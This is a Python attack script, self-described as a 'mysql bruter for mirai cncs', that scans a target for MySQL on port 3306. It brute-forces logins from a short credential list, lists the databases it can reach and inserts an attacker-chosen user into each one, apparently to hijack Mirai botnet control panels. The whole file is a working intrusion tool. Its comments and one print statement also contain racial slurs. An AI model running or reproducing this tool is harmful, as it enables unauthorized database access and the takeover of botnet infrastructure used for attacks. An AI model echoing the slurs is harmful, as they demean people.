import mysql.connector, colorama, concurrent.futures, socket, sys
from colorama import Fore
from mysql.connector import errorcode

HOST = sys.argv[1]
ADDUSR = sys.argv[2]
ADDPW = sys.argv[3]

BANNER = f'''
{Fore.BLUE}
███████╗██╗  ██╗██╗██████╗     ██████╗  ██████╗ ██████╗ 
██╔════╝██║ ██╔╝██║██╔══██╗    ██╔══██╗██╔═══██╗██╔══██╗
███████╗█████╔╝ ██║██║  ██║    ██████╔╝██║   ██║██████╔╝
╚════██║██╔═██╗ ██║██║  ██║    ██╔══██╗██║   ██║██╔═══╝ 
███████║██║  ██╗██║██████╔╝    ██████╔╝╚██████╔╝██║     
╚══════╝╚═╝  ╚═╝╚═╝╚═════╝     ╚═════╝  ╚═════╝ ╚═╝     
          [mysql bruter for mirai cncs]
              [Author: horrorhood]       
{Fore.RESET}                                       
'''

USERNAMES = [
  'root',
  'nig'
]

PASSWORDS = [
'root',
'nig'
]

DBS = []


def Log(txt:str):
    '''
    sexy logs
    '''
    print(f"[{Fore.BLUE}+{Fore.RESET}] {txt}.")


def CheckMysql(ip:str):
    '''
    tcp in that bitch using port 3306 (mysql port) and return bool
    '''

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2) # man fuck ur waiting

    try:
        s.connect((ip,3306))
        return True

    except:
        return False


def TryConnect(ip:str,username:str,password:str):
    '''
    just connect to the mysql server using mysql.connector and return true if no error is thrown
    '''

    try:

        conn = mysql.connector.connect(user=username, password=password, host=ip)
        conn.close()
        return True

    except mysql.connector.Error as err:

        if err.errno == errorcode.ER_ACCESS_DENIED_ERROR: # if error code is catched (failed password)
            return False


def GetDatabases(ip:str, username:str, password:str):
    '''
    connect to the mysql database and run the query (SHOW DATABASES) and save every single line (reponse) to an array
    '''

    try:

        conn = mysql.connector.connect(user=username, password=password, host=ip)
        cursor = conn.cursor()

        query = ("SHOW DATABASES;")

        cursor.execute(query)

        for (databases) in cursor:
            Log(f"Found database {databases[0]}")
            DBS.append(databases[0])
        
        conn.close()
        cursor.close()

    except mysql.connector.Error as err:

        if err.errno == errorcode.ER_ACCESS_DENIED_ERROR: # if error code is catched (failed password)
            Log("Error getting all databases")


def ExecMiraiAddUser(ip:str, mysqluser:str, mysqlpass:str, mysqldata:str, adduser:str, addpass:str):
    '''
    - execute a insert query (for mirai database)
    '''
    try:

        conn = mysql.connector.connect(user=mysqluser, password=mysqlpass, host=ip)
        cursor = conn.cursor()

        query = f'INSERT INTO users VALUES(NULL, "{adduser}", "{addpass}", 0, 0, 0, 0, -1, 1, 30, '')'

        cursor.execute(query)

        conn.commit()

        return True


    except mysql.connector.Error as err:
        if err.errno == errorcode.ER_ACCESS_DENIED_ERROR: # if error code is catched (failed password)
            return False
        


def GetAllMiraiUsers(ip:str, mysqluser:str, mysqlpass:str, mysqldata:str):
    '''
    - select all usernames/passwords from a mirai db and print it
    '''
    print("not done yet you nigger")


def main():
    print(BANNER) # skidder bop

    if CheckMysql(HOST):
        Log(f"Host as MYSQL running.")
    else:
        Log(f"Host doesnt have MYSQL running.")
        return


    for user in USERNAMES:
        for passw in PASSWORDS:
            if TryConnect(HOST, user,passw):
                Log(f"Success login with {user}:{passw}")

                GetDatabases(HOST,user,passw) # get all dbs from host and add them to an array

                for datab in DBS: # execute the mysql query on target host/database
                
                    if "information_schema" in datab:
                        continue

                    if ExecMiraiAddUser(HOST, user, passw, datab, ADDUSR, ADDPW):
                        Log(f'Inserted new user in {datab}')
                    else:
                        Log(f'Error inserting new user in {datab}')


            else:
                Log(f"Failed {user}:{passw}")

            


if __name__ == "__main__":
    main()